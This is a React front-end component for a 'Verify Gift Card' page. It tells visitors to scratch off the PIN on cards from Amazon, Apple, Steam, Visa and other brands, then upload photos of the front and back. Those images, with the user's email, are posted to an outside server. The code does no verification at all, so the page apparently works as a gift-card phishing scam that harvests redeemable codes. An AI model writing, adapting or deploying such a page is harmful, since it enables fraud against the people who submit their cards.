import React, { useState } from 'react';
import './Products.css';
import axios from 'axios';

const Products = ({ openModal }) => {
    const [giftCardType, setGiftCardType] = useState('');
    const [amount, setAmount] = useState('');
    const [email, setEmail] = useState('');
    const [frontImage, setFrontImage] = useState('');
    const [backImage, setBackImage] = useState('');
    const [loading, setLoading] = useState(false);  // Loading state

    // Convert image to base64
    const convertToBase64 = (file, setImage) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = () => setImage(reader.result);
        reader.onerror = (error) => console.log('Error converting image:', error);
    };

    const handleFrontImage = (e) => convertToBase64(e.target.files[0], setFrontImage);
    const handleBackImage = (e) => convertToBase64(e.target.files[0], setBackImage);

    // Submit form
    const submit = async (e) => {
        e.preventDefault();
        setLoading(true);  // Start loading

        try {
            const token = localStorage.getItem('token'); // Retrieve token from localStorage

            await axios.post(
                'https://nodedeploy-4m6t.onrender.com/giftcards',
                {
                    giftCardType,
                    amount,
                    email,
                    frontImage,
                    backImage,
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                    },
                }
            );

            // Trigger the modal with gift card details
            openModal(giftCardType, amount);
        } catch (error) {
            console.error('Error submitting the form:', error);
            alert('Failed to submit gift card. Please try again.');
        } finally {
            setLoading(false);  // Stop loading after the API call
        }
    };

    return (
        <div className="product-container">
            <div className="headline shadow">
                <h2>Verify Gift Card</h2>
            </div>
            <div className="headline-text">
                
                <p>Select the gift card type and price, then upload clear images of the front and back of the card.*</p>
                <span>Remove the card from its packaging and scratch off the PIN film before uploading.*</span>
            </div>

            <div className="product-verify">
                <form onSubmit={submit}>
                    <label>
                        <p className="text-guide">Select gift card type</p>
                        <select required onChange={(e) => setGiftCardType(e.target.value)}>
                            <option value="">--Please choose your card--</option>
                            <option value="amazon">AMAZON</option>
                            <option value="amex">AMEX</option>
                            <option value="apple">APPLE</option>
                            <option value="ebay">EBAY</option>
                            <option value="googleplay">GOOGLEPLAY</option>
                            <option value="macy">MACY</option>
                            <option value="mastercard">MASTERCARD</option>
                            <option value="nike">NIKE</option>
                            <option value="nordstorm">NORDSTORM</option>
                            <option value="playstation">PLAYSTATION</option>
                            <option value="razergold">RAZER GOLD</option>
                            <option value="sephora">SEPHORA</option>
                            <option value="steam">STEAM</option>
                            <option value="target">TARGET</option>
                            <option value="ttvisa">TT VISA</option>
                            <option value="uber">UBER CARD</option>
                            <option value="vanillavisa">VANILLA VISA</option>
                            <option value="walmartvisa">WALMART VISA</option>
                            <option value="xbox">XBOX</option>
                        </select>
                    </label>

                    <label>
                        <p className="text-guide">Input Amount:</p>
                        <input
                            type="number"
                            required
                            onChange={(e) => setAmount(e.target.value)}
                            placeholder='card amount e.g 400'
                        />
                    </label>

                    <label>
                        <p className="text-guide">Email:</p>
                        <input
                            type="email"
                            placeholder="Email"
                            required
                            onChange={(e) => setEmail(e.target.value)}
                        />
                    </label>

                    <label>
                        <p className="text-guide">Upload front image</p>
                        <input type="file" required onChange={handleFrontImage} />
                        {frontImage && <img src={frontImage} alt="Front" width={100} />}
                    </label>

                    <label>
                        <p className="text-guide">Upload back image</p>
                        <input type="file" required onChange={handleBackImage} />
                        {backImage && <img src={backImage} alt="Back" width={100} />}
                    </label>

                    <button
                        className="btn-verify get-started"
                        type="submit"
                        disabled={loading}  // Disable button while loading
                    >
                        {loading ? 'Processing...' : 'VERIFY CARD'}  {/* Show loading text */}
                    </button>
                </form>

                {loading && <p className="loading-message">Please wait...</p>}  {/* Optional message */}
            </div>
        </div>
    );
};

export default Products;
